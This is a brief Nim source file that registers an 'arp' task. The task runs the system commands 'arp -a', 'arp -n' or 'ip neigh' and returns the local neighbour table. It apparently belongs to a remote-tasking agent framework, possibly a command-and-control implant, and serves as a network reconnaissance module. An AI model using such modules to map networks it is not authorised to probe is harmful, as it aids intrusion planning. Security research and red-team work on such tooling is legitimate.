import std/[json, osproc]
import ../types
import ./registry

proc arpExecute(taskId: string, params: JsonNode, state: AgentState,
                send: SendMsg): TaskResult =
  try:
    var output = ""
    when defined(windows):
      let (out1, _) = execCmdEx("arp -a", options = {poStdErrToStdOut})
      output = out1
    else:
      let (out1, code1) = execCmdEx("arp -n", options = {poStdErrToStdOut})
      if code1 == 0:
        output = out1
      else:
        let (out2, _) = execCmdEx("ip neigh", options = {poStdErrToStdOut})
        output = out2
    return TaskResult(output: output, status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initArp*() =
  register("arp", arpExecute)
